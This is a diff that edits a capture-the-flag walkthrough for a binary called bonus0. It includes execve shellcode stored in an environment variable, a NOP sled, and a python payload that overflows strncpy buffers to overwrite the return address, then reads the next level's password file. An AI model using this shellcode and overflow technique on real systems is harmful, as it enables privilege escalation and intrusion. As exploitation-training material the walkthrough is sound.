@@ -1,4 +1,5 @@
-At first creating array of char with 54 cells.
+At first creating array of char with 54 cells
+for variable acStack58.
 
 And calling pp function
 In pp creating two arrays with 20 cells and sending to func p this two arrays.
@@ -14,7 +15,6 @@ Here is next function:
 * strcat()
 * gets()
 We should to find offset at this functions.
-If we write arguments longer than arrays size, we could find Segmentation fault.
 After first input of function we see second ' - '
 and writing second argument more than this of array
 123123123123123123123098328312910903219031290980321908123902139032100123092031898023133333333333333333333333333333333333333333333333333333333333333333333333333333333331231231231231231231230983283129109032190312909803219081239021390321001230920318980231333333333333333333333333333333333333333333333333333333333333333333333333333333333312312312312312312312309832831291090321903129098032190812390213903210012309203189802313333333333333333333333333333333333333333333333333333333333333333333333333333333333
@@ -28,13 +28,13 @@ There are not malloc. So we try to call script to break it from env constant whi
 which using offset of gets()
 Threfore we put our shell code to env
 
-export SHELLCODE=$(python -c "print '\x90'*90 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'")
+- export SHELLCODE=$(python -c "print '\x90'*90 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'")
 
 '\x90' - is the NOP - it's like argument which do not nothing instead other alphabetical letters.
 We using NOP than to fill stack and after it to start our shellcode.
 We write him 90 times and + our script than to start him.
 
-1. Fill first read() which 4096 bytes - 'A'*4095 
+1. Fill first read() which read from fd Zero 4096 bytes - 'A'*4095 
 2. Fill second string of strncpy() which 20 bytes - 'B' * 9
 When we enter data to two string of input
 3. Filling stack with NOP - '\x90'*64
@@ -63,13 +63,15 @@ gcc getenv.c -o getaddress
 And see address of SHELLCODE which we use for bonus0 binary.
 And put this address to python script to perform.
 
-python -c "print 'S'*4095 + '\n' + 'U'*9 + 'ADDRESS OF SHELLCODE IN ENV like -----> \x8a\xf8\xff\xbf' + 'K'*50" > /tmp/text
+python -c "print 'S'*4095 + '\n' + 'U'*9 + '\x8a\xf8\xff\xbf' + 'K'*50" > /tmp/text
 
-Therefore 'S' for first string()
-'U' for second string
-+ script from env
-+ 'K' for strncpy() in p()
+In assembler this one mean that we just fill first buff of read function
+
+For func read - 'S'*4095 + '\n'
+First string we are filling with - 'U'*9
+Address of SHELLCODE - '\x8a\xf8\xff\xbf'
+And overfill function strncpy with 50 symbols.
 
 Put this text to ./bonus0:
-Cat /tmp/text - | ./bonus0
+cat /tmp/text - | ./bonus0
 cat /home/user/bonus1/.pass <--- than to find flag.
